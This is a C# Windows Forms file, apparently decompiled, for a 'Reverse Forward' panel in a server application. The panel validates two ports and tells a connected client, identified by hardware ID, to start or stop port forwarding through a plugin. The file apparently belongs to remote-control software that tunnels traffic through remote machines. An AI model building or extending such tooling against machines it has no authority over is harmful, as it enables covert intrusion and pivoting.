using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using CustomControls.RJControls;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormReverseForward : FormMaterial
{
	public Clients parrent;

	private IContainer components;

	private Panel panel1;

	private MaterialSwitch switchStart;

	private MaterialLabel labelServer;

	private RJTextBox txtServerPort;

	private MaterialLabel labelClient;

	private RJTextBox txtClientPort;

	public FormReverseForward()
	{
		InitializeComponent();
	}

	private void FormReverseForward_Load(object sender, EventArgs e)
	{
		if (parrent != null)
		{
			Text = "Forward [" + parrent.Hwid + "]";
		}
	}

	private void switchStart_CheckedChanged(object sender, EventArgs e)
	{
		if (parrent == null || !parrent.itsConnect)
		{
			switchStart.Checked = false;
			MessageBox.Show("Client is not connected!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			return;
		}
		if (switchStart.Checked)
		{
			int serverPort = 0;
			int clientPort = 0;
			if (!int.TryParse(txtServerPort.Texts, out serverPort) || serverPort < 1 || serverPort > 65535)
			{
				switchStart.Checked = false;
				MessageBox.Show("Invalid Server Port! Enter a number between 1 and 65535.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			if (!int.TryParse(txtClientPort.Texts, out clientPort) || clientPort < 1 || clientPort > 65535)
			{
				switchStart.Checked = false;
				MessageBox.Show("Invalid Client Port! Enter a number between 1 and 65535.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			try
			{
				byte[] pluginData = LEB128.Write(new object[3] { "Start", serverPort, clientPort });
				parrent.Send(new object[3] { "Plugin", "ReverseForward", pluginData });
				txtClientPort.Enabled = false;
				txtServerPort.Enabled = false;
				Text = "Forward [" + parrent.Hwid + "] - Running";
				return;
			}
			catch (Exception ex)
			{
				switchStart.Checked = false;
				MessageBox.Show("Error: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
		}
		try
		{
			byte[] pluginData2 = LEB128.Write(new object[1] { "Stop" });
			parrent.Send(new object[3] { "Plugin", "ReverseForward", pluginData2 });
			txtClientPort.Enabled = true;
			txtServerPort.Enabled = true;
			Text = "Forward [" + parrent.Hwid + "] - Stopped";
		}
		catch (Exception ex2)
		{
			MessageBox.Show("Error: " + ex2.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	public void UpdateStatus(string status)
	{
		if (base.InvokeRequired)
		{
			Invoke((MethodInvoker)delegate
			{
				if (parrent != null)
				{
					Text = "Forward [" + parrent.Hwid + "] - " + status;
				}
				else
				{
					Text = "Forward - " + status;
				}
			});
		}
		else if (parrent != null)
		{
			Text = "Forward [" + parrent.Hwid + "] - " + status;
		}
		else
		{
			Text = "Forward - " + status;
		}
	}

	protected override void OnFormClosing(FormClosingEventArgs e)
	{
		try
		{
			if (parrent != null && parrent.itsConnect && switchStart.Checked)
			{
				byte[] pluginData = LEB128.Write(new object[1] { "Stop" });
				parrent.Send(new object[3] { "Plugin", "ReverseForward", pluginData });
			}
		}
		catch
		{
		}
		base.OnFormClosing(e);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.panel1 = new System.Windows.Forms.Panel();
		this.switchStart = new MaterialSkin.Controls.MaterialSwitch();
		this.labelServer = new MaterialSkin.Controls.MaterialLabel();
		this.txtServerPort = new CustomControls.RJControls.RJTextBox();
		this.labelClient = new MaterialSkin.Controls.MaterialLabel();
		this.txtClientPort = new CustomControls.RJControls.RJTextBox();
		this.panel1.SuspendLayout();
		base.SuspendLayout();
		this.panel1.BackColor = System.Drawing.Color.White;
		this.panel1.Controls.Add(this.switchStart);
		this.panel1.Controls.Add(this.labelServer);
		this.panel1.Controls.Add(this.txtServerPort);
		this.panel1.Controls.Add(this.labelClient);
		this.panel1.Controls.Add(this.txtClientPort);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.panel1.ForeColor = System.Drawing.Color.Black;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(794, 60);
		this.panel1.TabIndex = 0;
		this.switchStart.AutoSize = true;
		this.switchStart.Depth = 0;
		this.switchStart.Location = new System.Drawing.Point(54, 9);
		this.switchStart.Margin = new System.Windows.Forms.Padding(0);
		this.switchStart.MouseLocation = new System.Drawing.Point(-1, -1);
		this.switchStart.MouseState = MaterialSkin.MouseState.HOVER;
		this.switchStart.Name = "switchStart";
		this.switchStart.Ripple = true;
		this.switchStart.Size = new System.Drawing.Size(92, 37);
		this.switchStart.TabIndex = 0;
		this.switchStart.Text = "Start";
		this.switchStart.UseVisualStyleBackColor = true;
		this.switchStart.CheckedChanged += new System.EventHandler(switchStart_CheckedChanged);
		this.labelServer.AutoSize = true;
		this.labelServer.Depth = 0;
		this.labelServer.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.labelServer.Location = new System.Drawing.Point(152, 18);
		this.labelServer.MouseState = MaterialSkin.MouseState.HOVER;
		this.labelServer.Name = "labelServer";
		this.labelServer.Size = new System.Drawing.Size(61, 19);
		this.labelServer.TabIndex = 1;
		this.labelServer.Text = "Server ->";
		this.txtServerPort.BackColor = System.Drawing.Color.White;
		this.txtServerPort.BorderColor = System.Drawing.Color.FromArgb(0, 90, 0);
		this.txtServerPort.BorderFocusColor = System.Drawing.Color.FromArgb(0, 90, 0);
		this.txtServerPort.BorderRadius = 0;
		this.txtServerPort.BorderSize = 1;
		this.txtServerPort.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.txtServerPort.ForeColor = System.Drawing.Color.Black;
		this.txtServerPort.Location = new System.Drawing.Point(220, 14);
		this.txtServerPort.Margin = new System.Windows.Forms.Padding(4);
		this.txtServerPort.Multiline = false;
		this.txtServerPort.Name = "txtServerPort";
		this.txtServerPort.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.txtServerPort.PasswordChar = false;
		this.txtServerPort.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.txtServerPort.PlaceholderText = "Port";
		this.txtServerPort.Size = new System.Drawing.Size(212, 28);
		this.txtServerPort.TabIndex = 2;
		this.txtServerPort.Texts = "";
		this.txtServerPort.UnderlinedStyle = false;
		this.labelClient.AutoSize = true;
		this.labelClient.Depth = 0;
		this.labelClient.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.labelClient.Location = new System.Drawing.Point(448, 18);
		this.labelClient.MouseState = MaterialSkin.MouseState.HOVER;
		this.labelClient.Name = "labelClient";
		this.labelClient.Size = new System.Drawing.Size(57, 19);
		this.labelClient.TabIndex = 3;
		this.labelClient.Text = "Client ->";
		this.txtClientPort.BackColor = System.Drawing.Color.White;
		this.txtClientPort.BorderColor = System.Drawing.Color.FromArgb(0, 90, 0);
		this.txtClientPort.BorderFocusColor = System.Drawing.Color.FromArgb(0, 90, 0);
		this.txtClientPort.BorderRadius = 0;
		this.txtClientPort.BorderSize = 1;
		this.txtClientPort.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.txtClientPort.ForeColor = System.Drawing.Color.Black;
		this.txtClientPort.Location = new System.Drawing.Point(514, 14);
		this.txtClientPort.Margin = new System.Windows.Forms.Padding(4);
		this.txtClientPort.Multiline = false;
		this.txtClientPort.Name = "txtClientPort";
		this.txtClientPort.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.txtClientPort.PasswordChar = false;
		this.txtClientPort.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.txtClientPort.PlaceholderText = "Port";
		this.txtClientPort.Size = new System.Drawing.Size(212, 28);
		this.txtClientPort.TabIndex = 4;
		this.txtClientPort.Texts = "";
		this.txtClientPort.UnderlinedStyle = false;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(800, 130);
		base.Controls.Add(this.panel1);
		base.Name = "FormReverseForward";
		this.Text = "Forward";
		base.Load += new System.EventHandler(FormReverseForward_Load);
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		base.ResumeLayout(false);
	}
}
